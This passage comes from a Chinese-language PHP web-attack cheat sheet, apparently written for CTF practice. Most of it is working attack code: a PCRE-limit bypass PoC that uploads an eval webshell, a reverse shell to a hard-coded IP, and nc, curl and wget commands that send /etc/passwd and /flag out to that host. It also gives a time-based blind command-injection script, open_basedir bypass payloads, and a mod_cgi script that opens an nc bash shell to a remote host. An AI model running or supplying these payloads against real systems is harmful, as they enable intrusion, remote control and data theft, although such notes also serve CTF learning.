class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-comment">// fwrite($f, $input); ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>利用正则表达式prce最大次数默认为1000000：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pcre</span>.backtrack_limit默认为<span class="hljs-number">1000000</span><br></code></pre></td></tr></table></figure><p>发送超过1000000字符大小的数据来使正则执行失败写入木马。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#poc</span><br>import requests<br><span class="hljs-keyword">from</span> io import BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(b<span class="hljs-string">&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + b<span class="hljs-string">&#x27;a&#x27;</span> * 1000000)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://IP/index.php&#x27;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure><h3 id="10-无回显命令执行"><a href="#10-无回显命令执行" class="headerlink" title="10.无回显命令执行"></a>10.无回显命令执行</h3><p>无回显命令执行可以考虑反弹shell或者数据外带。</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>不多说，直接弹就行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sh</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">180.76.162.68</span>/<span class="hljs-number">8081</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h4><p><a href="https://blog.csdn.net/weixin_35910073/article/details/112458456">https://blog.csdn.net/weixin_35910073/article/details/112458456</a></p><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>目标机执行<br>nc –l –p <span class="hljs-number">1234</span> &lt; <span class="hljs-regexp">/etc/</span>passwd   <span class="hljs-comment">#将/etc/passwd映射到1234端口</span><br><span class="hljs-regexp">//</span>本机执行<br>nc IP:<span class="hljs-number">1234</span>  <span class="hljs-comment">#监听目标机1234端口接收数据</span><br></code></pre></td></tr></table></figure><h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>目标机执行<br>curl http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">8888</span> -File=@/flag<br><span class="hljs-regexp">//</span>本机监听<br>nc -lvnp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><h5 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h5><p>由于wget可以指定headers，body等，因此我们将敏感数据放到请求包中里去外带数据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>目标机执行<br>wget –header=<span class="hljs-string">&quot;EVIL:$(cat /flag)&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span><br>wget –header=”evil:`cat <span class="hljs-regexp">/etc/</span>passwd &#124; xargs echo –n`” http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span> <span class="hljs-comment">#多行读取</span><br>wget –post-data exfil=`cat <span class="hljs-regexp">/etc/</span>passwd`&amp;b=<span class="hljs-number">1</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span>  <span class="hljs-comment">#body传递</span><br>wget –post-file trophy.php http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span>  <span class="hljs-comment">#直接传递file</span><br><br><br><span class="hljs-regexp">//</span>本机监听<br>nc -lvnp <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><h4 id="命令盲注"><a href="#命令盲注" class="headerlink" title="命令盲注"></a>命令盲注</h4><p>如果上述命令都不能用那么就考虑命令盲注，采用延时注入的方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>s=requests.session()<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_!@#%&#124;^&amp;&#123;&#125;[]/-()+=,\\&#x27;</span>:<br>        starTime=time.time()<br>        url=<span class="hljs-string">&quot;http://127.0.0.1/?cmd=if [ `cut -c&quot;</span>+<span class="hljs-built_in">str</span>(z)+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-built_in">str</span>(z)+<span class="hljs-string">&quot; /flag` != &#x27;&quot;</span>+i+<span class="hljs-string">&quot;&#x27; ]; then echo 1 ; else sleep 3; fi&quot;</span><br>        r=s.get(url)<br>        <span class="hljs-keyword">if</span>((time.time()-starTime)&gt;<span class="hljs-number">3</span>):<br>            flag+=i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(z)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the flag is&#x27;</span>+flag)<br></code></pre></td></tr></table></figure><h2 id="php安全特性bypass"><a href="#php安全特性bypass" class="headerlink" title="php安全特性bypass"></a>php安全特性bypass</h2><h3 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h3><p><a href="https://www.cnblogs.com/hookjoy/p/12846164.html">https://www.cnblogs.com/hookjoy/p/12846164.html</a></p><p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。下面给出几种bypass技巧。</p><h4 id="利用sylink-符号链接"><a href="#利用sylink-符号链接" class="headerlink" title="利用sylink()符号链接"></a>利用sylink()符号链接</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">symlink</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$target</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$link</span> ) : <span class="hljs-keyword">bool</span><br><span class="hljs-comment">//用于创建一个指向taget的软链接link，target必须在open_basedir的范围内。</span><br></code></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//bypass.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;A&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;A&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;B&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;B&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;C&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;C&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;D&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;D&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&quot;A/B/C/D&quot;</span>,<span class="hljs-string">&quot;7ea&quot;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&quot;7ea/../../../../etc/passwd&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;7ea&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;7ea&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问bypass.php后就为passwd文件创建软链接exp，再访问exp即可读取任意文件。</p><h4 id="利用glob-x2F-x2F-伪协议杜根目录"><a href="#利用glob-x2F-x2F-伪协议杜根目录" class="headerlink" title="利用glob:&#x2F;&#x2F;伪协议杜根目录"></a>利用glob:&#x2F;&#x2F;伪协议杜根目录</h4><p>1.DirectoryIterator+glob:&#x2F;&#x2F; </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//传入  glob:///*  输出根目录下所有文件。</span><br></code></pre></td></tr></table></figure><p>2.opendir()+readdir()+glob:&#x2F;&#x2F; </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$a</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//传glob:///*</span><br></code></pre></td></tr></table></figure><h4 id="利用chdir-与ini-set-组合"><a href="#利用chdir-与ini-set-组合" class="headerlink" title="利用chdir()与ini_set()组合"></a>利用chdir()与ini_set()组合</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;mi1k7ea&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;mi1k7ea&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="利用bindtextdomain-函数报错判断文件存在"><a href="#利用bindtextdomain-函数报错判断文件存在" class="headerlink" title="利用bindtextdomain()函数报错判断文件存在"></a>利用bindtextdomain()函数报错判断文件存在</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">bindtextdomain</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$domain</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$directory</span> ) : <span class="hljs-keyword">string</span><br><span class="hljs-comment">//用于绑定domain到某个目录</span><br></code></pre></td></tr></table></figure><p>只能判断文件是否存在，不存在返回false，利用价值不是很大。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$re</span> = <span class="hljs-title function_ invoke__">bindtextdomain</span>(<span class="hljs-string">&#x27;xxx&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>]);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$re</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="利用realpath-gt-适用于windows"><a href="#利用realpath-gt-适用于windows" class="headerlink" title="利用realpath() -&gt;适用于windows"></a>利用realpath() -&gt;适用于windows</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>));<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&#x27;isexists&#x27;</span>);<br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;E:/wamp64/&#x27;</span>;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$dir</span> . <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$i</span>] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/File\((.*)\) is not within/&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$matches</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%s &lt;br/&gt;&quot;</span>, <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]);<br>        &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass disable_functions"></a>bypass disable_functions</h3><p>适用于拿到shell禁用了危险函数的情况。</p><p><a href="https://www.anquanke.com/post/id/208451?from=timeline">https://www.anquanke.com/post/id/208451?from=timeline</a></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>最新的两种bypass<code>php-concat-bypass</code>与<code>php-filter-bypass</code>。</p><p><a href="https://github.com/mm0r1/exploits">GitHub - mm0r1&#x2F;exploits: Pwn stuff.</a></p><h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><p>利用mail()等函数开启新进程加载恶意so，已总结不再赘述。</p><h4 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h4><p>本质上是利用·<code>.htaccess</code>，需要满足如下条件：</p><ul><li>目录下有写权限</li><li>apache 使用 apache_mod_php</li><li>Web 目录给了 AllowOverride 权限</li><li>启用了mod_cgi</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#上传.htaccess<br>Options +ExecCGI<br>AddHandler cgi-script .test<br><br>#上传shell.test<br>#!/bin/bash<br>echo&amp;&amp;cat /etc/passwd<br></code></pre></td></tr></table></figure><p>然后访问shell.test即可触发。</p><p>或者若允许上传php脚本可以直接执行php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;nc -c &#x27;/bin/bash&#x27; xxx.xx.xx.xx 4444&quot;</span>; <span class="hljs-comment">//command to be executed</span><br><span class="hljs-variable">$shellfile</span> = <span class="hljs-string">&quot;#!/bin/bashn&quot;</span>; <span class="hljs-comment">//using a shellscript</span><br><span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">&quot;echo -ne &quot;</span>Content-Type: text/html\n\n<span class="hljs-string">&quot;n&quot;</span>; <span class="hljs-comment">//header is needed, otherwise a 500 error is thrown when there is output</span><br><span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>; <span class="hljs-comment">//executing $cmd</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkEnabled</span>(<span class="hljs-params"><span class="hljs-variable">$text</span>,<span class="hljs-variable">$condition</span>,<span class="hljs-variable">$yes</span>,<span class="hljs-variable">$no</span></span>) //<span class="hljs-title">this</span> <span class="hljs-title">surely</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">shorter</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$text</span>: &quot;</span> . (<span class="hljs-variable">$condition</span> ? <span class="hljs-variable">$yes</span> : <span class="hljs-variable">$no</span>) . <span class="hljs-string">&quot;&lt;br&gt;n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;checked&#x27;</span>]))<br>&#123;<br>    @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="hljs-comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] . <span class="hljs-string">&#x27;?checked=true&#x27;</span>); <span class="hljs-comment">//execute the script again to see if the htaccess test worked</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$modcgi</span> = <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-string">&#x27;mod_cgi&#x27;</span>, <span class="hljs-title function_ invoke__">apache_get_modules</span>()); <span class="hljs-comment">// mod_cgi enabled?</span><br>    <span class="hljs-variable">$writable</span> = <span class="hljs-title function_ invoke__">is_writable</span>(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//current dir writable?</span><br>    <span class="hljs-variable">$htaccess</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTACCESS&#x27;</span>]); <span class="hljs-comment">//htaccess enabled?</span><br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Mod-Cgi enabled&quot;</span>,<span class="hljs-variable">$modcgi</span>,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);<br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Is writable&quot;</span>,<span class="hljs-variable">$writable</span>,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);<br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;htaccess working&quot;</span>,<span class="hljs-variable">$htaccess</span>,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$modcgi</span> &amp;&amp; <span class="hljs-variable">$writable</span> &amp;&amp; <span class="hljs-variable">$htaccess</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="hljs-comment">//abort if not</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Backing up .htaccess&quot;</span>,<span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.htaccess.bak&quot;</span>),<span class="hljs-string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//make a backup, cause you never know.</span><br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Write .htaccess file&quot;</span>,<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-string">&quot;Options +ExecCGInAddHandler cgi-script .dizzle&quot;</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//.dizzle is a nice extension</span><br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Write shell file&quot;</span>,<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.dizzle&#x27;</span>,<span class="hljs-variable">$shellfile</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//write the file</span><br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Chmod 777&quot;</span>,<span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-string">&quot;shell.dizzle&quot;</span>,<span class="hljs-number">0777</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//rwx</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="hljs-comment">//call the script</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h4><p>⭐参考： <a href="https://github.com/mm0r1/exploits">GitHub - mm0r1&#x2F;exploits: Pwn stuff.</a></p><p>利用json序列化中的堆溢出触发，借以绕过disable_function，影响范围是</p><ul><li>7.1 – all versions to date</li><li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><h4 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h4><p>利用的是PHP garbage collector程序中的堆溢出触发，影响范围为7.0-1.3</p><h4 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h4><p>影响版本是7.0-7.4</p><h4 id="FFI扩展"><a href="#FFI扩展" 